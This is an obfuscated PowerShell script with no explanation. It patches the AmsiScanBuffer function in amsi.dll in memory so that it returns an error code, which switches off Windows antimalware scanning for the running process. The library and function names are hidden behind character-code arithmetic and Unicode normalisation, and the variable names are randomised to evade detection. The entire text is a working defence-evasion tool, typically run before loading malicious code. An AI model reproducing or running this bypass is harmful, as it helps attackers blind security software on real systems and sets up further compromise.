$z7HeCp3E1xRPj8TH = @"
using System;
using System.Runtime.InteropServices;
public class z7HeCp3E1xRPj8TH {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr lutmEmXNc, string e8reCSAokKIjhtAW);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr G1fhP1e4Vk9rO7, UIntPtr SQ4S2BWws05iSM, uint AcrgS, out uint iOK6w4zX);
}
"@

Add-Type $z7HeCp3E1xRPj8TH

$pzq_ARsyMVzw0A = [z7HeCp3E1xRPj8TH]::LoadLibrary("$([CHAr]([BYtE]0x61)+[cHAR]([byTe]0x6d)+[chaR]([bYTe]0x73)+[char]([Byte]0x69)+[cHaR](46)+[chaR]([bYtE]0x64)+[ChAR](108+40-40)+[cHaR](108*11/11))")
$jzGVlroRCoUFFPd8L659 = [z7HeCp3E1xRPj8TH]::GetProcAddress($pzq_ARsyMVzw0A, "$(('Áms'+'ìSc'+'änB'+'ùff'+'èr').noRmAlIZE([CHAR](51+19)+[Char](111)+[ChaR](114*31/31)+[cHAR](50+59)+[CHAr](68*4/4)) -replace [CHAR](92+38-38)+[cHAR](112+77-77)+[CHaR]([BYTE]0x7b)+[cHaR]([BYTe]0x4d)+[chaR](110+14-14)+[chAR](125*29/29))")
$p = 0
[z7HeCp3E1xRPj8TH]::VirtualProtect($jzGVlroRCoUFFPd8L659, [uint32]5, 0x40, [ref]$p)
$ZuOngId3bKHeOtKKei = "0xB8"
$YrH15OTNtd1ZPoY4Z = "0x57"
$qulPxbAcEYNe = "0x00"
$FXO21ZePw7agDBAGT7 = "0x07"
$EmOL2EALsmt7LtModS = "0x80"
$rsW5eFEigrPCxuFNbO7M = "0xC3"
$oYwb = [Byte[]] ($ZuOngId3bKHeOtKKei,$YrH15OTNtd1ZPoY4Z,$qulPxbAcEYNe,$FXO21ZePw7agDBAGT7,+$EmOL2EALsmt7LtModS,+$rsW5eFEigrPCxuFNbO7M)
[System.Runtime.InteropServices.Marshal]::Copy($oYwb, 0, $jzGVlroRCoUFFPd8L659, 6)